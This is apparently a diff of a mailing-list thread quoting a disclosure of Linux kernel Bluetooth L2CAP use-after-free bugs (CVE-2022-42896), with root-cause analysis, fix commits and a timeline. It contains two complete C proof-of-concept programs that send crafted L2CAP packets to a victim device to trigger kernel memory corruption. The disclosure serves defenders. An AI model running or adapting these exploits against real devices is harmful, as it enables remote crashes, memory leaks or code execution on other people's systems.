-eEJeJyQ/8VFkCJQPQZEsIGzOTlPnwvVna0AS86n2Z+rK7R/usYs5iJCZ55/JISWd=0A=
-8xD57ue0eB47bcJvVqGlObI2DEG8TwaW0O0duRhDgzMEL4t1KdRAepIESBEA/iPp=0A=
-I4gfUbVEIEQuqdqQyO4GAe+MkD0Hy5JH/0qgFmbaSegNTdQg5iqYjRZ3ttiswalq=0A=
-l1/iSyv1WYeC1OAs+2BLOAT2NEggSiVOtxEfgewsQtCWi8H1SoirakIfo45Hz0tk=0A=
-/Ad9ZWh2PvOGt97Ka85o4TLJxgJJqGEnqcFUZnJJriwoaRIS8N2C8/nEM53jb1sH=0A=
-0gYddMU3QxY7dYNLIUrRKQeNkF30dK7V6JRH7pleRlf+wQcNfRAIUrNlatj9Txwi=0A=
-vQrKnC9aIFFHEy/0mAgtrQShcMRmMgVlRoOA5B8RTulRLCmkafvwuhs6dCxN0GNA=0A=
-ORIVVFxjx9Vn7OqYPgwiofZ6SbEl0hgPyWBQvE85klFLZLoj7p+joDY1XNQztmfA=0A=
-rnJ9x+YV4igjWImINAZSlmEcYtd+xy3Li/8oeYDAqrsnrOjb+WvGhCykJk4urBog=0A=
-2LNtcyCjkTs7F+WeXGUo0NDhbd3Z6AyFfqeF7uJ3D5hlpX2nI9no/ugPrrTVoVZA=0A=
-grrnNz0iZG2DVx46x913pVKHl5mlYQARAQABwsFfBBgBAgAJBQJafgNKAhsMAAoJ=0A=
-ELKItV//nCLBwNIP/AiIHE8boIqReFQyaMzxq6lE4YZCZNj65B/nkDOvodSiwfwj=0A=
-jVVE2V3iEzxMHbgyTCGA67+Bo/d5aQGjgn0TPtsGzelyQHipaUzEyrsceUGWYoKX=0A=
-YyVWKEfyh0cDfnd9diAm3VeNqchtcMpoehETH8frRHnJdBcjf112PzQSdKC6kqU0=0A=
-Q196c4Vp5HDOQfNiDnTf7gZSj0BraHOByy9LEDCLhQiCmr+2E0rW4tBtDAn2HkT9=0A=
-uf32ZGqJCn1O+2uVfFhGu6vPE5qkqrbSE8TG+03H8ecU2q50zgHWPdHMOBvy3Ehz=0A=
-fAh2VmOSTcRK+tSUe/u3wdLRDPwv/DTzGI36Kgky9MsDC5gpIwNbOJP2G/q1wT1o=0A=
-Gkw4IXfWv2ufWiXqJ+k7HEi2N1sree7Dy9KBCqb+ca1vFhYPDJfhP75I/VnzHVss=0A=
-Z/rYZ9+51yDoUABoNdJNSGUYl+Yh9Pw9pE3Kt4EFzUlFZWbE4xKL/NPno+z4J9aW=0A=
-emLLszcYz/u3XnbOvUSQHSrmfOzX3cV4yfmjM5lewgSstoxGyTx2M8enslgdXhPt=0A=
-hZlDnTnOT+C+OTsh8+m5tos8HQjaPM01MKBiAqdPgksm1wu2DrrwUi6ChRVTUBcj=0A=
-6+/9IJ81H2P2gJk3Ls3AVIxIffLoY34E+MYSfkEjBz0E8CLOcAw7JIwAaeBTzsFN=0A=
-BGbyLVgBEACqClxh50hmBepTSVlan6EBq3OAoxhrAhWZYEwN78k+ENhK68KhqC5R=0A=
-IsHzlL7QHW1gmfVBQZ63GnWiraM6wOJqFTL4ZWvRslga9u28FJ5XyK860mZLgYhK=0A=
-9BzoUk4s+dat9jVUbq6LpQ1Ot5I9vrdzo2p1jtQ8h9WCIiFxSYy8s8pZ3hHh5T64=0A=
-GIj1m/kY7lG3VIdUgoNiREGf/iOMjUFjwwE9ZoJ26j9p7p1U+TkKeF6wgswEB1T3=0A=
-J8KCAtvmRtqJDq558IU5jhg5fgN+xHB8cgvUWulgK9FIF9oFxcuxtaf/juhHWKMO=0A=
-RtL0bHfNdXoBdpUDZE+mLBUAxF6KSsRrvx6AQyJs7VjgXJDtQVWvH0PUmTrEswgb=0A=
-49nNU+dLLZQAZagxqnZ9Dp5l6GqaGZCHERJcLmdY/EmMzSf5YazJ6c0vO8rdW27M=0A=
-kn73qcWAplQn5mOXaqbfzWkAUPyUXppuRHfrjxTDz3GyJJVOeMmMrTxH4uCaGpOX=0A=
-Z8tN6829J1roGw4oKDRUQsaBAeEDqizXMPRc+6U9vI5FXzbAsb+8lKW65G7JWHym=0A=
-YPOGUt2hK4DdTA1PmVo0DxH00eWWeKxqvmGyX+Dhcg+5e191rPsMRGsDlH6KihI6=0A=
-+3JIuc0y6ngdjcp6aalbuvPIGFrCRx3tnRtNc7He6cBWQoH9RPwluwARAQABwsOs=0A=
-BBgBCgAgFiEEdodNnxM2uiJZBxxxsoi1X/+cIsEFAmbyLVgCGwICQAkQsoi1X/+c=0A=
-IsHBdCAEGQEKAB0WIQSilC2pUlbVp66j3+yzNoc6synyUwUCZvItWAAKCRCzNoc6=0A=
-synyU85gD/0T1QDtPhovkGwoqv4jUbEMMvpeYQf+oWgm/TjWPeLwdjl7AtY0G9Ml=0A=
-ZoyGniYkoHi37Gnn/ShLT3B5vtyI58ap2+SSa8SnGftdAKRLiWFWCiAEklm9FRk8=0A=
-N3hwxhmSFF1KR/AIDS4g+HIsZn7YEMubBSgLlZZ9zHl4O4vwuXlREBEW97iL/FSt=0A=
-VownU2V39t7PtFvGZNk+DJH7eLO3jmNRYB0PL4JOyyda3NH/J92iwrFmjFWWmmWb=0A=
-/Xz8l9DIs+Z59pRCVTTwbBEZhcUc7rVMCcIYL+q1WxBG2e6lMn15OQJ5WfiE6E0I=0A=
-sGirAEDnXWx92JNGx5l+mMpdpsWhBZ5iGTtttZesibNkQfd48/eCgFi4cxJUC4PT=0A=
-UQwfD9AMgzwSTGJrkI5XGy+XqxwOjL8UA0iIrtTpMh49zw46uV6kwFQCgkf32jZM=0A=
-OLwLTNSzclbnA7GRd8tKwezQ/XqeK3dal2n+cOr+o+Eka7yGmGWNUqFbIe8cjj9T=0A=
-JeF3mgOCmZOwMI+wIcQYRSf+e5VTMO6TNWH5BI3vqeHSt7HkYuPlHT0pGum88d4a=0A=
-pWqhulH4rUhEMtirX1hYx8Q4HlUOQqLtxzmwOYWkhl1C+yPObAvUDNiHCLf9w28n=0A=
-uihgEkzHt9J4VKYulyJM9fe3ENcyU6rpXD7iANQqcr87ogKXFxknZ97uEACvSucc=0A=
-RbnnAgRqZ7GDzgoBerJ2zrmhLkeREZ08iz1zze1JgyW3HEwdr2UbyAuqvSADCSUU=0A=
-GN0vtQHsPzWl8onRc7lOPqPDF8OO+UfN9NAfA4wl3QyChD1GXl9rwKQOkbvdlYFV=0A=
-UFx9u86LNi4ssTmU8p9NtHIGpz1SYMVYNoYy9NU7EVqypGMguDCL7gJt6GUmA0sw=0A=
-p+YCroXiwL2BJ7RwRqTpgQuFL1gShkA17D5jK4mDPEetq1d8kz9rQYvAR/sTKBsR=0A=
-ImC3xSfn8zpWoNTTB6lnwyP5Ng1bu6esS7+SpYprFTe7ZqGZF6xhvBPf1Ldi9UAm=0A=
-U2xPN1/eeWxEa2kusidmFKPmN8lcT4miiAvwGxEnY7Oww9CgZlUB+LP4dl5VPjEt=0A=
-sFeAhrgxLdpVTjPRRwTd9VQF3/XYl83j5wySIQKIPXgT3sG3ngAhDhC8I8GpM36r=0A=
-8WJJ3x2yVzyJUbBPO0GBhWE2xPNIfhxVoU4cGGhpFqz7dPKSTRDGq++MrFgKKGpI=0A=
-ZwT3CPTSSKc7ySndEXWkOYArDIdtyxdE1p5/c3aoz4utzUU7NDHQ+vVIwlnZSMiZ=0A=
-jek2IJP3SZ+COOIHCVxpUaZ4lnzWT4eDqABhMLpIzw6NmGfg+kLBJhouqz81WITr=0A=
-EtJuZYM5blWncBOJCoWMnBEcTEo/viU3GgcVRw=3D=3D=0A=
-=3Dx94R=0A=
------END PGP PUBLIC KEY BLOCK-----=0A=
+On Wed, Dec 14, 2022 at 4:06 PM Salvatore Bonaccorso <carnil@debian.org>
+wrote:
 
---------------1HiA6wkfNwfx2L9XgtZ0eYKY--
+> Hi,
+>
+> On Wed, Dec 14, 2022 at 01:13:21PM -0500, Rafael Correa De Ysasi wrote:
+> > Summary
+> >
+> > There are use-after-free vulnerabilities in the Linux kernel's
+> > net/bluetooth/l2cap_core.c's l2cap_connect and l2cap_le_connect_req
+> functions
+> > which may allow code execution and leaking kernel memory (respectively)
+> > remotely via Bluetooth.
+> >
+> > The l2cap_le_connect_req bug was introduced in commit 27e2d4c
+> > <
+> https://github.com/torvalds/linux/commit/27e2d4c8d28be1d1b4ecfbffab572d7d=
+bd35254d
+> >
+> > (version:
+> > 3.12.0, date: 2013-Dec-05), the SMP channel is available since commit
+> > 70db83c
+> > <
+> https://github.com/torvalds/linux/commit/70db83c4bcdc1447bbcb318389561c90=
+d7056b18
+> >
+> > (version:
+> > 3.16.0, date: 2014-Aug-14).
+> > Severity
+> >
+> > Moderate
+> > Proof of Concept
+> >
+> > *UAF read in l2cap_le_connect_req*
+> >
+> > *```*
+> >
+> > #include <stdlib.h>
+> > #include <unistd.h>
+> > #include <sys/socket.h>
+> > #include <sys/uio.h>
+> > #include <bluetooth/bluetooth.h>
+> > #include <bluetooth/l2cap.h>
+> > #include <bluetooth/hci.h>
+> > #include <bluetooth/hci_lib.h>
+> > typedef struct l2cap_le_conn_req {
+> >         uint16_t     psm;
+> >         uint16_t     scid;
+> >         uint16_t     mtu;
+> >         uint16_t     mps;
+> >         uint16_t     credits;
+> > } __attribute__ ((packed)) l2cap_le_conn_req;
+> > int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
+> > uint16_t data_length) {
+> >   uint8_t type =3D HCI_ACLDATA_PKT;
+> >   uint16_t BCflag =3D 0x0000;
+> >   uint16_t PBflag =3D 0x0002;
+> >   uint16_t flags =3D ((BCflag << 2) | PBflag) & 0x000F;
+> >
+> >   hci_acl_hdr hdr;
+> >   hdr.handle =3D htobs(acl_handle_pack(hci_handle, flags));
+> >   hdr.dlen =3D data_length;
+> >
+> >   struct iovec iv[3];
+> >
+> >   iv[0].iov_base =3D &type;
+> >   iv[0].iov_len =3D 1;
+> >   iv[1].iov_base =3D &hdr;
+> >   iv[1].iov_len =3D HCI_ACL_HDR_SIZE;
+> >   iv[2].iov_base =3D data;
+> >   iv[2].iov_len =3D data_length;
+> >
+> >   return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
+> > }
+> >
+> > #define L2CAP_CID_LE_SIGNALING  0x0005
+> > #define L2CAP_LE_CONN_REQ       0x14
+> > #define L2CAP_CID_SMP           0x0006
+> > #define L2CAP_CID_SMP_BREDR     0x0007
+> > int main(int argc, char **argv) {
+> >   if (argc !=3D 2) {
+> >     printf("Usage: %s MAC_ADDR\n", argv[0]);
+> >     return 1;
+> >   }
+> >
+> >   bdaddr_t dst_addr;
+> >   str2ba(argv[1], &dst_addr);
+> >
+> >   printf("[*] Resetting hci0 device...\n");
+> >   system("sudo hciconfig hci0 down");
+> >   system("sudo hciconfig hci0 up");
+> >
+> >   printf("[*] Opening hci device...\n");
+> >   struct hci_dev_info di;
+> >   int hci_device_id =3D hci_get_route(NULL);
+> >   int hci_socket =3D hci_open_dev(hci_device_id);
+> >   if (hci_devinfo(hci_device_id, &di) < 0) {
+> >     perror("hci_devinfo");
+> >     return 1;
+> >   }
+> >
+> >   struct hci_filter flt;
+> >   hci_filter_clear(&flt);
+> >   hci_filter_all_ptypes(&flt);
+> >   hci_filter_all_events(&flt);
+> >   if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) <
+> 0) {
+> >     perror("setsockopt(HCI_FILTER)");
+> >     return 1;
+> >   }
+> >
+> >   int opt =3D 1;
+> >   if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) <
+> 0) {
+> >     perror("setsockopt(HCI_DATA_DIR)");
+> >     return 1;
+> >   }
+> >
+> >   printf("[*] Connecting to victim...\n");
+> >
+> >   struct sockaddr_l2 laddr =3D {0};
+> >   laddr.l2_family =3D AF_BLUETOOTH;
+> >   laddr.l2_bdaddr_type =3D BDADDR_LE_PUBLIC;
+> >   laddr.l2_bdaddr =3D di.bdaddr;
+> >
+> >   struct sockaddr_l2 raddr =3D {0};
+> >   raddr.l2_family =3D AF_BLUETOOTH;
+> >   raddr.l2_bdaddr_type =3D BDADDR_LE_PUBLIC;
+> >   raddr.l2_bdaddr =3D dst_addr;
+> >
+> >   int l2_sock;
+> >   printf("[*] socket\n");
+> >   if ((l2_sock =3D socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
+> >     perror("socket");
+> >     return 1;
+> >   }
+> >
+> >   printf("[*] bind\n");
+> >   if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
+> >     perror("bind");
+> >     return 1;
+> >   }
+> >
+> >   printf("[*] connect\n");
+> >   if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
+> >     perror("connect");
+> >     return 1;
+> >   }
+> >
+> >   printf("[*] getsockopt\n");
+> >   struct l2cap_conninfo l2_conninfo;
+> >   socklen_t l2_conninfolen =3D sizeof(l2_conninfo);
+> >   if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
+> > &l2_conninfolen) < 0) {
+> >     perror("getsockopt");
+> >     return 1;
+> >   }
+> >
+> >   uint16_t hci_handle =3D l2_conninfo.hci_handle;
+> >   printf("[+] HCI handle: %x\n", hci_handle);
+> >
+> >   struct {
+> >     l2cap_hdr hdr;
+> >     l2cap_cmd_hdr cmd_hdr;
+> >     l2cap_le_conn_req req;
+> >   } packet =3D {0};
+> >   packet.hdr.len =3D htobs(sizeof(packet) - L2CAP_HDR_SIZE);
+> >   packet.hdr.cid =3D htobs(L2CAP_CID_LE_SIGNALING);
+> >   packet.cmd_hdr.code =3D L2CAP_LE_CONN_REQ;
+> >   packet.cmd_hdr.ident =3D 0x1;
+> >   packet.cmd_hdr.len =3D sizeof(packet.req);
+> >   packet.req.psm =3D htobs(0);
+> >   packet.req.scid =3D htobs(0x42);
+> >   packet.req.mtu =3D htobs(23);
+> >   packet.req.mps =3D htobs(23);
+> >   packet.req.credits =3D htobs(0xff);
+> >
+> >   printf("[*] Sending malicious L2CAP packet...\n");
+> >   hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
+> >
+> >   close(l2_sock);
+> >   hci_close_dev(hci_socket);
+> >
+> >   return 0;
+> > }
+> >
+> > ```
+> >
+> > *UAF write in l2cap_connect*
+> >
+> > *```*
+> >
+> > #include <stdlib.h>
+> > #include <unistd.h>
+> > #include <sys/socket.h>
+> > #include <sys/uio.h>
+> > #include <bluetooth/bluetooth.h>
+> > #include <bluetooth/l2cap.h>
+> > #include <bluetooth/hci.h>
+> > #include <bluetooth/hci_lib.h>
+> > int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
+> > uint16_t data_length) {
+> >   uint8_t type =3D HCI_ACLDATA_PKT;
+> >   uint16_t BCflag =3D 0x0000;
+> >   uint16_t PBflag =3D 0x0002;
+> >   uint16_t flags =3D ((BCflag << 2) | PBflag) & 0x000F;
+> >
+> >   hci_acl_hdr hdr;
+> >   hdr.handle =3D htobs(acl_handle_pack(hci_handle, flags));
+> >   hdr.dlen =3D data_length;
+> >
+> >   struct iovec iv[3];
+> >
+> >   iv[0].iov_base =3D &type;
+> >   iv[0].iov_len =3D 1;
+> >   iv[1].iov_base =3D &hdr;
+> >   iv[1].iov_len =3D HCI_ACL_HDR_SIZE;
+> >   iv[2].iov_base =3D data;
+> >   iv[2].iov_len =3D data_length;
+> >
+> >   return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
+> > }
+> >
+> > #define L2CAP_CID_SIGNALING     0x0001
+> > #define L2CAP_CONN_REQ          0x02
+> > #define L2CAP_CID_SMP           0x0006
+> > #define L2CAP_CID_SMP_BREDR     0x0007
+> > int main(int argc, char **argv) {
+> >   if (argc !=3D 2) {
+> >     printf("Usage: %s MAC_ADDR\n", argv[0]);
+> >     return 1;
+> >   }
+> >
+> >   bdaddr_t dst_addr;
+> >   str2ba(argv[1], &dst_addr);
+> >
+> >   printf("[*] Resetting hci0 device...\n");
+> >   system("sudo hciconfig hci0 down");
+> >   system("sudo hciconfig hci0 up");
+> >
+> >   printf("[*] Opening hci device...\n");
+> >   struct hci_dev_info di;
+> >   int hci_device_id =3D hci_get_route(NULL);
+> >   int hci_socket =3D hci_open_dev(hci_device_id);
+> >   if (hci_devinfo(hci_device_id, &di) < 0) {
+> >     perror("hci_devinfo");
+> >     return 1;
+> >   }
+> >
+> >   struct hci_filter flt;
+> >   hci_filter_clear(&flt);
+> >   hci_filter_all_ptypes(&flt);
+> >   hci_filter_all_events(&flt);
+> >   if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) <
+> 0) {
+> >     perror("setsockopt(HCI_FILTER)");
+> >     return 1;
+> >   }
+> >
+> >   int opt =3D 1;
+> >   if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) <
+> 0) {
+> >     perror("setsockopt(HCI_DATA_DIR)");
+> >     return 1;
+> >   }
+> >
+> >   printf("[*] Connecting to victim...\n");
+> >
+> >   struct sockaddr_l2 laddr =3D {0};
+> >   laddr.l2_family =3D AF_BLUETOOTH;
+> >   laddr.l2_bdaddr_type =3D BDADDR_BREDR;
+> >   laddr.l2_bdaddr =3D di.bdaddr;
+> >
+> >   struct sockaddr_l2 raddr =3D {0};
+> >   raddr.l2_family =3D AF_BLUETOOTH;
+> >   raddr.l2_bdaddr_type =3D BDADDR_BREDR;
+> >   raddr.l2_bdaddr =3D dst_addr;
+> >
+> >   int l2_sock;
+> >   printf("[*] socket\n");
+> >   if ((l2_sock =3D socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
+> >     perror("socket");
+> >     return 1;
+> >   }
+> >
+> >   printf("[*] bind\n");
+> >   if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
+> >     perror("bind");
+> >     return 1;
+> >   }
+> >
+> >   printf("[*] connect\n");
+> >   if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
+> >     perror("connect");
+> >     return 1;
+> >   }
+> >
+> >   printf("[*] getsockopt\n");
+> >   struct l2cap_conninfo l2_conninfo;
+> >   socklen_t l2_conninfolen =3D sizeof(l2_conninfo);
+> >   if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
+> > &l2_conninfolen) < 0) {
+> >     perror("getsockopt");
+> >     return 1;
+> >   }
+> >
+> >   uint16_t hci_handle =3D l2_conninfo.hci_handle;
+> >   printf("[+] HCI handle: %x\n", hci_handle);
+> >
+> >   struct {
+> >     l2cap_hdr hdr;
+> >     l2cap_cmd_hdr cmd_hdr;
+> >     l2cap_conn_req req;
+> >   } packet =3D {0};
+> >   packet.hdr.len =3D htobs(sizeof(packet) - L2CAP_HDR_SIZE);
+> >   packet.hdr.cid =3D htobs(L2CAP_CID_SIGNALING);
+> >   packet.cmd_hdr.code =3D L2CAP_CONN_REQ;
+> >   packet.cmd_hdr.ident =3D 0x1;
+> >   packet.cmd_hdr.len =3D sizeof(packet.req);
+> >   packet.req.psm =3D htobs(0);
+> >   packet.req.scid =3D htobs(0x42);
+> >
+> >   printf("[*] Sending malicious L2CAP packet...\n");
+> >   hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
+> >
+> >   close(l2_sock);
+> >   hci_close_dev(hci_socket);
+> >
+> >   return 0;
+> > }
+> >
+> > ```
+> >
+> > To make SMP available for BR/EDR devices (in case of a hardware
+> supporting
+> > it is not available), you can force it by running: echo Y >
+> > /sys/kernel/debug/bluetooth/hci0/force_bredr_smp
+> > Further Analysis
+> >
+> > *Bug Analysis*
+> > There are UAF races in l2cap_connect
+> > <
+> https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee4=
+3b5aaf/net/bluetooth/l2cap_core.c#L4113
+> >
+> >  and l2cap_le_connect_req
+> > <
+> https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee4=
+3b5aaf/net/bluetooth/l2cap_core.c#L5789
+> >
+> > methods.
+> > After a channel is created via the new_connection callback, it is not
+> > locked but __set_chan_timer sets up a timer which can call
+> > l2cap_chan_timeout and can cleanup the channel before the method
+> finishes,
+> > causing UAF read in l2cap_le_connect_req
+> > <
+> https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee4=
+3b5aaf/net/bluetooth/l2cap_core.c#L5899
+> >
+> >  and UAF write in l2cap_connect
+> > <
+> https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee4=
+3b5aaf/net/bluetooth/l2cap_core.c#L4247
+> >
+> > .
+> >
+> > As the channel timeout is normally 40 seconds
+> > <
+> https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee4=
+3b5aaf/include/net/bluetooth/l2cap.h#L55
+> >
+> >  (L2CAP_CONN_TIMEOUT), winning the race would be infeasible, but due to=
+ a
+> > bug in SMP's implementation, SMP channels created by smp_new_conn_cb
+> > <
+> https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee4=
+3b5aaf/net/bluetooth/smp.c#L3241
+> >
+> > have
+> > their get_sndtimeo callback set to l2cap_chan_no_get_sndtimeo which
+> returns
+> > 0
+> > <
+> https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee4=
+3b5aaf/include/net/bluetooth/l2cap.h#L964
+> >
+> > as
+> > timeout value thus causing the timer to run immediately (on a different
+> > thread) after the __set_chan_timer call.
+> >
+> > Note: in l2cap_le_connect_req (without FLAG_DEFER_SETUP), the timer is
+> > canceled via the l2cap_chan_ready call almost immediately after the
+> > __set_chan_timer call, but even this small time window enough for the
+> timer
+> > with 0 timeout to start.
+> >
+> > Another root cause of the issue can be that the SMP channel is available
+> > via l2cap_global_chan_by_psm if the request contains psm=3D0. Multiple
+> > channels can be registered without PSM (PSM is 0, and channel is
+> identified
+> > by SCID) but only one of them is returned (which needs to be SMP to be
+> able
+> > to trigger the vulnerability).
+> >
+> > ```
+> >
+> > static int l2cap_le_connect_req(...)
+> > {
+> >     ...
+> >     mutex_lock(&conn->chan_lock);
+> >     ...
+> >     chan =3D pchan->ops->new_connection(pchan); // chan is not locked
+> >     ...
+> >     __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
+> > l2cap_chan_timeout running from a different thread
+> >     ...
+> >     if (test_bit(FLAG_DEFER_SETUP, &chan->flags)) { // branch usually
+> not taken
+> >         ...
+> >     } else {
+> >         l2cap_chan_ready(chan); // calls __clear_chan_timer(chan),
+> resets timer
+> >         result =3D L2CAP_CR_LE_SUCCESS;
+> >     }
+> >     ...
+> >     mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
+> > until this call
+> >     ...
+> >     if (chan) { // [7] UAF read
+> >         rsp.mtu =3D cpu_to_le16(chan->imtu);
+> >         rsp.mps =3D cpu_to_le16(chan->mps);
+> >     } else {
+> >     ...
+> > }
+> >
+> > ```
+> >
+> > Similar issue within l2cap_connect:
+> >
+> > ```
+> >
+> > static struct l2cap_chan *l2cap_connect(...)
+> > {
+> >     ...
+> >     mutex_lock(&conn->chan_lock);
+> >     ...
+> >     chan =3D pchan->ops->new_connection(pchan); // chan is not locked
+> >     ...
+> >     __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
+> > l2cap_chan_timeout running from a different thread
+> >     ...
+> >     mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
+> > until this call
+> >     ...
+> >     if (chan && !test_bit(CONF_REQ_SENT, &chan->conf_state) && // UAF
+> read
+> >         result =3D=3D L2CAP_CR_SUCCESS) {
+> >         u8 buf[128];
+> >         set_bit(CONF_REQ_SENT, &chan->conf_state); // UAF write
+> >         l2cap_send_cmd(conn, l2cap_get_ident(conn), L2CAP_CONF_REQ,
+> >                    l2cap_build_conf_req(chan, buf, sizeof(buf)), buf);
+> >         chan->num_conf_req++;
+> >     }
+> >     return chan;
+> > }
+> >
+> > ```
+> >
+> > The affected code path in SMP implementation:
+> >
+> > ```
+> >
+> > static inline struct l2cap_chan *smp_new_conn_cb(struct l2cap_chan
+> *pchan)
+> > {
+> >     =E2=80=A6
+> >     chan->ops =3D &smp_chan_ops;
+> >     =E2=80=A6
+> > }
+> > static const struct l2cap_ops smp_chan_ops =3D {
+> >     =E2=80=A6
+> >     .get_sndtimeo =3D l2cap_chan_no_get_sndtimeo,
+> >     =E2=80=A6
+> > };
+> > static inline long l2cap_chan_no_get_sndtimeo(struct l2cap_chan *chan)
+> > {
+> >     return 0;
+> > }
+> >
+> > ```
+> >
+> > *Reachability*
+> > SMP channel is available for Bluetooth Low Energy since BT 4.0 (~2009)
+> > which can be used to trigger the UAF read in l2cap_le_connect_req, and =
+it
+> > is also available for BT BR/EDR since BT 5.2 (~2020, to support Secure
+> > Connections) to trigger the UAF write in l2cap_connect.
+> >
+> > No other prerequisites were found, the bugs were triggered on a
+> > KASAN-enabled Ubuntu 22.04 kernel (an artificial delay was added before
+> the
+> > UAF read/write to make winning the race easier).
+> >
+> > Note: it is possible that the bugs can be triggered via other channels
+> > which may be created automatically by the specific environment.
+> > Patch
+> >
+> > The vulnerability was fixed by not accepting 0 as a valid PSM value in
+> > commit 711f8c3
+> > <
+> https://github.com/torvalds/linux/commit/711f8c3fb3db61897080468586b970c8=
+7c61d9e4
+> >
+> > and
+> > by preventing l2cap_global_chan_by_psm to give back L2CAP_CHAN_FIXED
+> channels
+> > in commit f937b75
+> > <
+> https://github.com/torvalds/linux/commit/f937b758a188d6fd328a81367087eddb=
+b2fce50f
+> >
+> > .
+> > Timeline
+> >
+> > *Date reported*: 10/06/2022
+> > *Date fixed*: 10/26/2022
+> > *Date disclosed*: 11/28/2022
+>
+> According to
+>
+> https://github.com/google/security-research/security/advisories/GHSA-pf87=
+-6c9q-jvm4
+> this should have CVE-2022-42896 assigned.
+>
+> Regards,
+> Salvatore
+>
 
---------------wy2BEVwOx0bMhEquSY7Ikg05--
-
---------------x1Qs2o9OIaPYDoHSrLHLdKK1
-Content-Type: application/pgp-signature; name="OpenPGP_signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="OpenPGP_signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAEBCgAdFiEEopQtqVJW1aeuo9/sszaHOrMp8lMFAmoDZgoACgkQszaHOrMp
-8lMHUQ/+KWl09Phy8xMC1rZcTFjZrYu6kOBkUFT58IOFwKccVhB4VNQOCarPqTFl
-GW9ETegvyYoSvqefl+Cke2XjxVulvvNT1nYd6YPAC/CNBxOr7GMzC+sXxv5sqyOS
-ipfje8IKNXXphbU8FIjc/KA4Gu0Jiome2ncggBKz6P4R2ndpX8BaMg7Y+Ix5aJd+
-YKWeHrTSLJNEuY57E7WSBQ6NhGaEUT8aeCOtztSbVD91l5bDnF6NLxYxDDWF48uD
-wXMM94oHaznqv48x0wSyJDDafjYJuu0yEoBbdZ+Ysit/M+dIk62ho+xVOrr9HcZc
-8ZUHy+hnQxF/uv2GwyJaABQow2R8CYbG+qT4dJegeH9rjQi1hRwewUa+SMSV/ESn
-n+ThWNeqLj24b6c+ibrvACuN+nnVxAgd9iFZK+jHCiFt68s3esnU6UwClr6gzWm7
-GbkKH3DWUkvpXmk78L1Hra1DyG4QeSl4XzWtm/UD/JnleZPqurHhb+KlHFYVp8Mc
-UkDZw80gms/LpgXAMY0dABrnBdWBwu9FUXkkAhi0CRjeeQc8C4trYAe18QvUjWYY
-DJhziMc1I8JY9qAT6vy3Yp+tEbdS/m5iULBBqJrqP9HWSwRXB1YQAfqWQciX8KBt
-K0/ExCrrL0Z/QCCCOCSRe+gcobENosehknb7WMA0INDHgKMHjgA=
-=RHVu
------END PGP SIGNATURE-----
-
---------------x1Qs2o9OIaPYDoHSrLHLdKK1--
+--000000000000eeaff705efe3a0a7--
